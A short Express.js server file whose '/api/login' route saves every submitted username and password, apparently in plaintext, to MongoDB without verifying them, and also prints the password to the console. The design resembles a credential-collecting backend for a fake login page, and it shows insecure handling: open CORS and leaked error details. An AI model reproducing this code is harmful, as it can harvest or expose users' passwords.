const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();
require('./mongo'); // MongoDB connection
const User = require('./models/user');

const app = express();

app.use(cors());
app.use(bodyParser.json());

// POST route to store credentials
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  try {
    console.log('Received login:', username, password); // debug
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    const newUser = new User({ username, password });
    await newUser.save();
    res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error saving user:', err);
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// Optional health check
app.get('/', (req, res) => {
  res.send('Backend is running');
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
